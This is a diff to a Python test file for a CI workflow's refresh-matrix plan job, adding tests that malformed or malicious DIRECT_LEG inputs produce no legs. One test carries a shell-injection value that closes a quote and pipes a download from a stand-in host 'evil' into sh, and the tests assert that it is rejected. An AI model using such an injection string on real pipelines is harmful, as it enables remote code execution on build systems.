@@ -1,15 +1,15 @@
-"""image-refresh.yml plan-job contract (issue #1820).
+"""image-refresh.yml plan-job contract (issue #1823).
 
 Runs the REAL 'Build refresh matrix from ci-metadata' step script (extracted
 from the workflow YAML, executed with a fake `git` serving a fixture matrix)
 and asserts the emitted strategy matrix:
 
-  - upgrade.available gates a refresh leg REGARDLESS of the entry's `ci` flag
-    (the version tracker refreshes the latest image per channel; smoke fan-out
-    eligibility is a separate concern);
+  - a bare dispatch plans NOTHING (the upgrade.available matrix mode is
+    retired — the reconcile loop decides what runs);
+  - DIRECT_LEG passes one validated leg through verbatim (charset-constrained,
+    force_flag enum) and wins over self_refresh;
   - SELF_REFRESH=true emits from==to `--force` legs for the newest amd64 entry
-    per channel (patch/GA re-publish under the same floating tag), ignoring
-    upgrade.available;
+    per channel (manual operator re-publish);
   - route-only and aarch64 entries never produce a leg (no ARM smoke image).
 """
 
@@ -157,6 +157,18 @@ class TestDirectLeg:
     def test_incomplete_direct_leg_plans_nothing(self, tmp_path: Path) -> None:
         # Missing required fields (e.g. image_name) must not produce a leg
         leg = {k: v for k, v in self.LEG.items() if k != "image_name"}
+        matrix = _run_plan(tmp_path, [_entry()], direct_leg=json.dumps(leg))
+        assert matrix["include"] == []
+
+    def test_metacharacter_leg_values_are_rejected(self, tmp_path: Path) -> None:
+        # Review F4 hardening: leg fields reach ${{ matrix.* }} interpolation in
+        # the refresh job's run bodies — shell metacharacters never pass
+        leg = dict(self.LEG, pfsense_version='26.07"; curl evil|sh; "')
+        matrix = _run_plan(tmp_path, [_entry()], direct_leg=json.dumps(leg))
+        assert matrix["include"] == []
+
+    def test_force_flag_must_be_empty_or_force(self, tmp_path: Path) -> None:
+        leg = dict(self.LEG, force_flag="--rm-everything")
         matrix = _run_plan(tmp_path, [_entry()], direct_leg=json.dumps(leg))
         assert matrix["include"] == []
 
